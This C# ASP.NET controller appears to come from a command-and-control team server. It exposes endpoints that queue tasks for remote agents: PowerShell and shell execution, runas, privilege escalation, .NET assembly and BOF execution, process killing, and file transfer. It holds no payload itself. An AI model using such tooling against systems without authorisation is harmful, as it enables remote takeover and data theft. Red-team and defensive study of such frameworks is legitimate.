//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using Microsoft.AspNetCore.Mvc;
using TeamServer.Controllers;
using TeamServer.Services;
using Trinity.Shared.DTOs.Command;
using Trinity.Shared.Interfaces;
namespace TeamServer.Controllers
{
    [Route(Routes.Commands)]
    [ApiController]
    public class CommandController : ControllerBase
    {
        private CommandService _commandService;

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Default constructor.
        /// </summary>
        public CommandController(CommandService commandService)
        {
            this._commandService = commandService;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Queues a PowerShell task for the specified agent and returns the asynchronous command response.
        /// </summary>
        /// <remarks>Uses the command service to enqueue the task; the response contains the assigned
        /// TaskID when successful.</remarks>
        /// <param name="agentId">Target agent identifier.</param>
        /// <param name="powershellDTO">Payload describing the PowerShell command and execution options.</param>
        /// <returns>An IActionResult containing an AsyncCommandResponseDTO. Returns 200 OK with the response when the task is
        /// queued and 400 Bad Request if the task could not be created.</returns>
        [HttpPost("{agentId}/spawn/powershell")]
        public async Task<IActionResult> QueuePowerShellCommand([FromRoute] int agentId, PowerShellDTO powershellDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(powershellDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Execute a command using shell.
        /// </summary>
        /// <param name="agentId"></param>
        /// <param name="shellDTO"></param>
        /// <returns></returns>
        [HttpPost("{agentId}/spawn/shell")]
        public async Task<IActionResult> QueueShellCommand([FromRoute] int agentId, ShellDTO shellDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(shellDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/runas")]
        public async Task<IActionResult> QueueRunAsCommand([FromRoute] int agentId, RunAsDTO runAsDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(runAsDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/run")]
        public async Task<IActionResult> QueueRunCommand([FromRoute] int agentId, RunDTO runDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(runDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/runu")]
        public async Task<IActionResult> QueueRunUCommand([FromRoute] int agentId, RunUDTO runUDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(runUDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/killprocess")]
        public async Task<IActionResult> QueueRunUCommand([FromRoute] int agentId, KillProcessDTO killProcessDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(killProcessDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/escalate")]
        public async Task<IActionResult> QueueKillProcessCommand([FromRoute] int agentId, EscalateDTO escalateDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(escalateDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/dotnetassembly")]
        public async Task<IActionResult> QueueDotNetAsmCommand([FromRoute] int agentId, DotNetAsmDTO dotNetAsmDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(dotNetAsmDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/bof")]
        public async Task<IActionResult> QueueBofCommand([FromRoute] int agentId, BofDTO bofDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(bofDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/filedownload")]
        public async Task<IActionResult> QueueFileDownloadCommand([FromRoute] int agentId, DownloadDTO downloadDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(downloadDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/cancelFileDownload")]
        public async Task<IActionResult> QueueFileDownloadCommand([FromRoute] int agentId, CancelDownloadDTO cancelDownloadDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(cancelDownloadDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/upload")]
        public async Task<IActionResult> QueueUploadCommand([FromRoute] int agentId, UploadDTO uploadDTO)
        {
            AsyncCommandResponseDTO response = await this._commandService.QueueTask(uploadDTO, agentId);

            if (response.TaskID == null)
            {
                return BadRequest(response);
            }

            return Ok(response);
        }
    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//